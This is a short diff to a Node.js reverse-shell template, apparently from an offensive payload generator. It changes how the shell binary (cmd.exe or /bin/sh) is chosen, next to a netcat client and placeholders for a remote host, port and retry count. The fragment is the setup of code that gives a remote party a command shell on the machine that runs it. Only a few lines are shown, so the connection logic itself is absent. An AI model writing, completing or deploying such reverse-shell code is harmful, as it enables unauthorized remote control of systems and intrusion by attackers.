@@ -10,7 +10,7 @@ process.on('uncaughtException', function(err) {
 var nc = new NetcatClient()
 
 // Marker replaced at runtime.
-var CMD = '{{os}}' === 'win32' ? 'cmd.exe' : '/bin/sh'
+var CMD = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
 var RHOST = '{{rhost}}'
 var RPORT = {{rport}}
 var RETRY = {{retry}}
